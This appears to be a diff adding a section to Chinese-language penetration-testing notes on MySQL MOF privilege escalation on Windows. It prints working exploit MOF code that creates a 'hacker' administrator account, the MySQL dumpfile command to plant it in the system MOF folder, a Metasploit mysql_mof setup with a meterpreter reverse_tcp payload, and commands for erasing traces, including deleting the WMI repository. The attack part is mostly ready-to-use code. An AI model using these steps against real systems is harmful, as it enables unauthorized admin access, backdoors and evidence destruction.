+    - 托管对象格式 (MOF) 文件是创建和注册提供程序、事件类别和事件的简便方法。文件路径为：c:/windows/system32/wbme/mof/nullevt.mof，其作用是每隔五秒就会去监控进程创建和死亡。
+
+- **提权原理**
+
+    - MOF文件每五秒就会执行，而且是系统权限，我们通过mysql使用load_file 将文件写入/wbme/mof/nullevt.mof，然后系统每隔五秒就会执行一次我们上传的MOF。MOF当中有一段是vbs脚本，我们可以通过控制这段vbs脚本的内容让系统执行命令，进行提权
+
+    **公开的nullevt.mof利用代码**
+
+    ```
+    #pragma namespace("\\\\.\\root\\subscription") 
+     
+    instance of __EventFilter as $EventFilter 
+    { 
+        EventNamespace = "Root\\Cimv2"; 
+        Name  = "filtP2"; 
+        Query = "Select * From __InstanceModificationEvent " 
+                "Where TargetInstance Isa \"Win32_LocalTime\" " 
+                "And TargetInstance.Second = 5"; 
+        QueryLanguage = "WQL"; 
+    }; 
+     
+    instance of ActiveScriptEventConsumer as $Consumer 
+    { 
+        Name = "consPCSV2"; 
+        ScriptingEngine = "JScript"; 
+        ScriptText = 
+    "var WSH = new ActiveXObject(\"WScript.Shell\")\nWSH.run(\"net.exe user hacker P@ssw0rd /add\")\nWSH.run(\"net.exe localgroup administrators hacker /add\")"; 
+    }; 
+     
+    instance of __FilterToConsumerBinding 
+    { 
+        Consumer   = $Consumer; 
+        Filter = $EventFilter; 
+    };
+    ```
+
+    - 脚本功能：创建一个hacker账号，并且加入管理员组
+
+- 将上面的脚本上传到有读写权限的目录下,，然后写入到nullevt.mof文件中：
+
+    - ```mysql
+        select load_file("C:/xxxx/xxxx/testtest.mof") into dumpfile "c:/windows/system32/wbem/mof/nullevt.mof"
+        ```
+
+- **使用msf自带mof模块提权**
+
+    - ```
+        use exploit/windows/mysql/mysql_mof
+         
+        # 设置payload
+        set payload windows/meterpreter/reverse_tcp
+         
+        # 设置目标 MySQL 的基础信息
+        set rhosts 192.168.127.132
+        set username root
+        set password 123456
+        run
+        ```
+
+- **关于Mof提权的弊端，痕迹清楚**
+
+    - 每隔几分钟会重新执行添加用户的命令，所以想清理痕迹得先暂时关闭 winmgmt 服务再删除mof 文件，此时删除用户才有效果。
+
+    - ```
+        # 停止 winmgmt 服务
+        net stop winmgmt
+         
+        # 删除 Repository 文件夹
+        rmdir /s /q C:\Windows\system32\wbem\Repository\
+         
+        # 手动删除 mof 文件
+        del C:\Windows\system32\wbem\mof\good\test.mof /F /S
+         
+        # 删除创建的用户
+        net user hacker /delete
+         
+        # 重新启动服务
+        net start winmgmt
+        ```
+
 
 
 ## SQLServer：
